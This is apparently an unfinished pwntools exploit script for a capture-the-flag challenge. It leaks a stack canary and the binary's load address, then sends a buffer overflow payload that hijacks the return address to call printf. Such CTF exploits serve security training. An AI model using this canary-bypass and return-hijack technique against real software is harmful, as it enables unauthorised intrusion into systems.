#!/usr/bin/python3

# didn't finish

from pwn import *

PROG_NAME = "./vuln"
REMOTE_IP = "pwn.ctf.unswsecurity.com"
REMOTE_PORT = 5000

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

ret_addr = 0x0000100e

p.recvlines(2)
vuln_addr = int(p.recvline().rstrip().split()[-1], 16)
canary = u32(p.recvline().rstrip()[-4:])
print(canary)


elf.address = vuln_addr - elf.symbols['vuln']
print(hex(elf.plt['puts']), hex(elf.got['puts']))

payload = b'A' * (0x24 - 0xc)
payload += p32(canary)
payload += b'A' * 0xc
payload += p32(elf.symbols['printf'])
payload += p32(elf.symbols['vuln'])
payload += p32(0x33)

p.sendline(payload)

p.interactive()